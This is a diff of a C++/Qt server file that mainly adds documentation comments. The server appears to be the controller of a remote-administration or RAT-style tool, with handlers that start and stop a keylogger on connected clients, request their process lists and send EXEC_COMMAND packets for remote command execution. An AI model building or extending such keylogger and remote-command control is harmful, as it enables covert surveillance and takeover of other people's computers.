@@ -1,6 +1,9 @@
 #include "ServerApp.hpp"
-#include <QDebug>
 
+/**
+ * @brief Constructs ServerApp and initializes networking from .env.
+ * @param envFilePath Path to .env file containing port configuration.
+ */
 ServerApp::ServerApp(const std::string& envFilePath)
     : m_envFilePath(envFilePath)
 {
@@ -17,13 +20,20 @@ ServerApp::ServerApp(const std::string& envFilePath)
     m_serverSocket.listenSocket();
 }
 
+/**
+ * @brief Destructor closes the listening socket.
+ */
 ServerApp::~ServerApp()
 {
     m_serverSocket.closeSocket();
 }
 
-// Prepare the fd_set and compute current maxFd for select()
-// Adds listening socket and all client sockets.
+/**
+ * @brief Prepares the read fd_set for select, including listener and clients.
+ * @param readfds Reference to fd_set to populate.
+ * @param maxFd Reference to current maximum file descriptor.
+ * @param listenFd Output listening socket fd.
+ */
 void ServerApp::prepareFdSet(fd_set& readfds, int& maxFd, int& listenFd)
 {
     FD_ZERO(&readfds);
@@ -37,7 +47,11 @@ void ServerApp::prepareFdSet(fd_set& readfds, int& maxFd, int& listenFd)
     }
 }
 
-// Accept a new incoming client if the listening socket is ready.
+/**
+ * @brief Accepts a new client if the listening socket is ready.
+ * @param readfds Current read fd_set from select.
+ * @param listenFd Listening socket file descriptor.
+ */
 void ServerApp::acceptNewClientIfAny(const fd_set& readfds, int listenFd)
 {
     if (FD_ISSET(listenFd, &readfds)) {
@@ -48,8 +62,12 @@ void ServerApp::acceptNewClientIfAny(const fd_set& readfds, int listenFd)
     }
 }
 
-// Process one client at index idx: receive, deserialize, handle GET_INFO vs others.
-// Updates idx appropriately (increment or stays if client removed).
+/**
+ * @brief Processes a single client: handles GET_INFO or other packets.
+ * @param idx Index of client in vector; may be modified if client is removed.
+ * @param readfds fd_set from select() indicating readable sockets.
+ * @param nextSessionId Counter used to assign unique session IDs.
+ */
 void ServerApp::processClient(size_t& idx, const fd_set& readfds, uint32_t& nextSessionId)
 {
     auto& client = m_clients[idx];
@@ -62,7 +80,6 @@ void ServerApp::processClient(size_t& idx, const fd_set& readfds, uint32_t& next
         std::string clientInfo = m_clientUsers[idx] + " " + client->getClientIP();
 
         if (pkt.getType() == PacketType::GET_INFO) {
-            // Extract username from JSON-ish payload and emit connected signal.
             std::string payload(pkt.getPayload().begin(), pkt.getPayload().end());
             const std::string key = "\"username\":\"";
             std::string username;
@@ -77,7 +94,6 @@ void ServerApp::processClient(size_t& idx, const fd_set& readfds, uint32_t& next
             clientInfo = username + " " + client->getClientIP();
             emit clientConnected(QString::fromStdString(clientInfo), nextSessionId++);
         } else {
-            // Other packet types: forward to UI and optionally ack.
             std::string msg(pkt.getPayload().begin(), pkt.getPayload().end());
             qDebug() << "[ServerApp] pkt=" << static_cast<int>(pkt.getType())
                      << " from" << QString::fromStdString(clientInfo)
@@ -97,7 +113,9 @@ void ServerApp::processClient(size_t& idx, const fd_set& readfds, uint32_t& next
     }
 }
 
-// Main loop, now short: orchestrates helpers to satisfy the 25-line body constraint.
+/**
+ * @brief Main loop: waits for socket activity and dispatches to helpers.
+ */
 void ServerApp::run()
 {
     std::cout << "Server ready, waiting for connections...\n";
@@ -118,6 +136,10 @@ void ServerApp::run()
     }
 }
 
+/**
+ * @brief Sends a GET_INFO request to a client.
+ * @param clientId Identifier of target client (username + IP).
+ */
 void ServerApp::onGetInfoSys(const QString& clientId)
 {
     uint32_t sessionId = 0;
@@ -127,6 +149,10 @@ void ServerApp::onGetInfoSys(const QString& clientId)
     sendToClientInternal(clientId, qraw);
 }
 
+/**
+ * @brief Sends the "start" keylogger command to client.
+ * @param clientId Identifier of target client.
+ */
 void ServerApp::onStartKeylogger(const QString& clientId)
 {
     qDebug() << "[ServerApp] onStartKeylogger for" << clientId;
@@ -141,6 +167,10 @@ void ServerApp::onStartKeylogger(const QString& clientId)
     qDebug() << "[ServerApp] Keylogger started for" << clientId;
 }
 
+/**
+ * @brief Sends the "stop" keylogger command to client.
+ * @param clientId Identifier of target client.
+ */
 void ServerApp::onStopKeylogger(const QString& clientId)
 {
     qDebug() << "[ServerApp] onStopKeylogger for" << clientId;
@@ -155,6 +185,11 @@ void ServerApp::onStopKeylogger(const QString& clientId)
     qDebug() << "[ServerApp] Keylogger stopped for" << clientId;
 }
 
+/**
+ * @brief Requests process list from a client.
+ * @param clientId Identifier of target client.
+ * @param namesOnly If true, only names are requested.
+ */
 void ServerApp::onRequestProcessList(const QString& clientId, bool namesOnly)
 {
     qDebug() << "[ServerApp] onRequestProcessList for" << clientId << "namesOnly=" << namesOnly;
@@ -166,6 +201,11 @@ void ServerApp::onRequestProcessList(const QString& clientId, bool namesOnly)
     sendToClientInternal(clientId, qraw);
 }
 
+/**
+ * @brief Public wrapper to forward arbitrary data to a client.
+ * @param clientInfo Identifier (username + IP) of target client.
+ * @param data Binary payload.
+ */
 void ServerApp::onSendToClient(const QString& clientInfo, const QByteArray& data)
 {
     // Wrap the command text in an EXEC_COMMAND packet
@@ -190,6 +230,11 @@ void ServerApp::onSendToClient(const QString& clientInfo, const QByteArray& data
     qDebug() << "[ServerApp] EXEC_COMMAND packet sent to" << clientInfo;
 }
 
+/**
+ * @brief Internal lookup by clientId and actual send over socket.
+ * @param clientId Identifier (username + IP).
+ * @param data Binary payload to transmit.
+ */
 void ServerApp::sendToClientInternal(const QString& clientId, const QByteArray& data)
 {
     auto parts = clientId.split(' ');
